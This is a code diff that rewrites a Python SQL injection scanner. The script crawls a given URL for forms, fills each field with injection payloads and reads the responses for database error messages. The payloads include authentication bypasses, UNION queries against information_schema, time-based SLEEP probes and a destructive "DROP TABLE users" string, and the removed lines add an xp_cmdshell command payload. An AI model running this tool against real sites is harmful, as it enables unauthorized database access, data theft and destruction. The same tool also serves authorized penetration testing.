@@ -1,136 +1,155 @@
 import requests
-import sys
-import re
-import threading
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import sys
+import time
+import threading
 
-# List of common SQLi payloads for error-based, time-based, and blind injections
-payloads = [
-    "' OR 1=1 --",  # Basic OR-based SQLi
-    "' OR 'a'='a",  # Basic OR-based SQLi (alternative)
-    "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
-    "' OR 1=1#", 
-    "' OR 1=1/*", 
-    "'; DROP TABLE users; --",  # Dangerous payload to test
-    "' AND 1=2 --",  # False condition for blind SQLi
-    "' AND 1=2#",  # Another blind SQLi check
-    "' WAITFOR DELAY '0:0:5' --",  # Time-based SQLi
-    "'; EXEC xp_cmdshell('ping 127.0.0.1') --"  # Attempt to use xp_cmdshell
+# Enhanced list of SQL injection payloads
+sql_payloads = [
+    r"' OR 1=1 --",
+    r"' OR 'a'='a",
+    r'" OR "a"="a"',
+    r"' UNION SELECT NULL, NULL, NULL --",
+    r"' UNION SELECT table_name FROM information_schema.tables --",
+    r"' AND 1=1 --",
+    r"' AND 1=2 --",
+    r"' OR 1=1#",
+    r"' OR SLEEP(5) --",
+    r"' OR 1=1/*",
+    r"'; DROP TABLE users --",
+    r'" OR "a"="a" --',
+    r"1' AND (SELECT COUNT(*) FROM users) > 0 --",
+    # New payloads
+    r"' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
+    r"' OR IF(1=1, SLEEP(5), 0) --",
+    # Added payload
+    r"admin' OR '1'='1",  # New payload for SQL injection
 ]
 
-# Error messages to detect SQL injection
-error_keywords = [
-    "error", "syntax", "warning", "mysql", "sql", "unclosed", "unexpected", "invalid", "select", "database", "extract"
+# Common SQL error messages for detection
+sql_error_signatures = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "sqlstate[hy000]",
+    "microsoft odbc",
+    "syntax error",
 ]
 
-# Function to check for SQL injection in the response text
-def detect_sqli(response_text):
-    for keyword in error_keywords:
-        if re.search(r"\b" + re.escape(keyword) + r"\b", response_text, re.IGNORECASE):
-            return True
-    return False
-
-# Function to scan a URL for SQL injection vulnerabilities
-def check_sqli(url, payload, method, headers, data):
+# Function to send HTTP requests
+def send_request(url, data=None, headers=None):
     try:
-        # Print the payload being tested
-        print(f"TRYING PAYLOAD: {payload}")
-        
-        if method == 'GET':
-            # Append payload to the URL
-            parsed_url = urlparse(url)
-            query_params = parse_qs(parsed_url.query)
-            for key in query_params:
-                query_params[key] = [payload]
-            parsed_url = parsed_url._replace(query=urlencode(query_params, doseq=True))
-            full_url = urlunparse(parsed_url)
-            response = requests.get(full_url, headers=headers, timeout=5)
+        if data:
+            response = requests.post(url, data=data, headers=headers)
+        else:
+            response = requests.get(url, headers=headers)
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+        return None
 
-        elif method == 'POST':
-            # Use the provided data with the payload
-            if data:
-                for key in data:
-                    data[key] = payload
-            response = requests.post(url, data=data, headers=headers, timeout=5)
-
-        # Check for SQL error keywords in the response
-        if detect_sqli(response.text):
-            print(f"[Vulnerable] SQL injection detected with payload: {payload} on {url}")
-            return True
-        return False
-    except requests.RequestException as e:
-        print(f"[Error] Unable to reach URL: {e}")
-        return False
-
-# Function to scan parameters dynamically
-def scan_parameters(url, headers, method, data=None):
-    parsed_url = urlparse(url)
-    params = parse_qs(parsed_url.query)
-
-    # Scan all URL parameters
-    for param in params:
-        for payload in payloads:
-            if check_sqli(url, payload, method, headers, data):
-                print(f"[INFO] SQL injection detected on parameter: {param} with payload: {payload}")
-
-# Function to scan POST data (form data)
-def scan_post_data(url, headers, data):
-    if data:
-        for key in data:
-            for payload in payloads:
-                data_copy = data.copy()  # Avoid mutating the original data
-                data_copy[key] = payload
-                if check_sqli(url, payload, 'POST', headers, data_copy):
-                    print(f"[INFO] SQL injection detected in POST parameter: {key} with payload: {payload}")
-
-# Function to detect and count forms on the page
-def detect_forms(url):
-    try:
-        response = requests.get(url, timeout=5)
+# Function to find forms on a page
+def find_forms(url, headers=None):
+    response = send_request(url, headers=headers)
+    if response and response.status_code == 200:
         soup = BeautifulSoup(response.text, 'html.parser')
         forms = soup.find_all('form')
-        form_count = len(forms)
-        print(f"[INFO] Found {form_count} form(s) on the page.")
         return forms
-    except requests.RequestException as e:
-        print(f"[Error] Unable to fetch forms from URL: {e}")
-        return []
+    return []
 
-# Threading function to speed up the scanning process
-def scan_in_thread(url, method, headers, data=None):
-    if method == 'GET':
-        scan_parameters(url, headers, 'GET', data)
-    elif method == 'POST':
-        scan_post_data(url, headers, data)
+# Function to test SQL injection on a form
+def test_form(url, form, method, headers=None):
+    action_url = form.get('action', '')
+    if not action_url.startswith("http"):
+        action_url = urljoin(url, action_url)
 
-# Main function
+    # Extract form inputs
+    inputs = form.find_all('input')
+    data = {}
+    for input_tag in inputs:
+        name = input_tag.get('name', '')
+        input_type = input_tag.get('type', 'text')
+        if input_type == 'hidden' or input_type == 'text':
+            data[name] = "' OR '1'='1"
+        elif input_type == 'password':
+            data[name] = "' OR '1'='1"
+        else:
+            data[name] = 'test'
+
+    for payload in sql_payloads:
+        for key in data.keys():
+            data[key] = payload
+            print(f"Testing with payload: {payload}")
+            if method == 'post':
+                response = send_request(action_url, data=data, headers=headers)
+            else:
+                response = send_request(action_url + "?" + "&".join([f"{k}={v}" for k, v in data.items()]), headers=headers)
+
+            if response and response.status_code == 200:
+                for error_signature in sql_error_signatures:
+                    if error_signature in response.text.lower():
+                        print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
+                        return True
+            time.sleep(0.5)  # To avoid overwhelming the server
+    return False
+
+# Main function to scan a URL
+def scan_url(url, headers=None):
+    print(f"Scanning {url} for forms...")
+    forms = find_forms(url, headers=headers)
+
+    # Initialize vulnerability state
+    vulnerability_logged = False
+
+    if forms:
+        print(f"{len(forms)} form(s) detected. Testing for SQL Injection vulnerabilities...")
+        for form in forms:
+            method = form.get('method', 'get').lower()
+            vulnerable = test_form(url, form, method, headers=headers)
+            if vulnerable:
+                print("[+] Vulnerability found and logged!")
+                vulnerability_logged = True
+                break  # Stop testing after finding one vulnerability
+    else:
+        print("No forms detected on this page.")
+
+    # Print "FAILED" if no vulnerabilities were logged
+    if not vulnerability_logged:
+        print("FAILED: No SQL injection vulnerabilities detected.")
+
+# Threaded scanning function
+def threaded_scan(urls, headers=None):
+    threads = []
+    for url in urls:
+        t = threading.Thread(target=scan_url, args=(url, headers))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+# Main function to accept command-line arguments
 def main():
-    if len(sys.argv) < 2:
-        print("Usage: python sqlscan.py <URL>")
+    if len(sys.argv) < 3 or sys.argv[1] != '-u':
+        print("Usage: python sqlscan.py -u <url> [optional: --headers 'Header1: Value1, Header2: Value2']")
         sys.exit(1)
 
-    url = sys.argv[1]
-    headers = {}  # You can extend this for custom headers (like User-Agent, Cookies, etc.)
-    data = {}  # For POST requests, this can hold form data
+    url = sys.argv[2].strip()  # Strip unnecessary spaces or newlines
+    if not url.startswith("http"):
+        print("Error: Invalid URL. Please provide a valid URL starting with http or https.")
+        sys.exit(1)
 
-    # Detect forms on the page
-    print(f"Scanning URL: {url}")
-    forms = detect_forms(url)
+    headers = None
+    if len(sys.argv) > 3 and sys.argv[3] == '--headers':
+        try:
+            headers = {k.strip(): v.strip() for k, v in [h.split(":") for h in sys.argv[4].split(",")] }
+        except ValueError:
+            print("Error: Invalid headers format. Use '--headers \"Header1: Value1, Header2: Value2\"'")
+            sys.exit(1)
 
-    # Check if the URL contains GET parameters or POST data
-    parsed_url = urlparse(url)
-    if '?' in parsed_url.query:  # It's a GET request with parameters
-        print(f"Scanning GET request for SQLi: {url}")
-        scan_in_thread(url, 'GET', headers)
-    elif forms:  # Scan forms if detected
-        print(f"Scanning detected forms for SQLi: {url}")
-        for form in forms:
-            # Simulate form scanning; you can extend this to scan specific form fields
-            scan_post_data(url, headers, data)
-    else:  # POST request with no detected forms
-        print(f"Scanning POST request for SQLi: {url}")
-        scan_in_thread(url, 'POST', headers, data)
+    scan_url(url, headers=headers)
 
 if __name__ == "__main__":
     main()
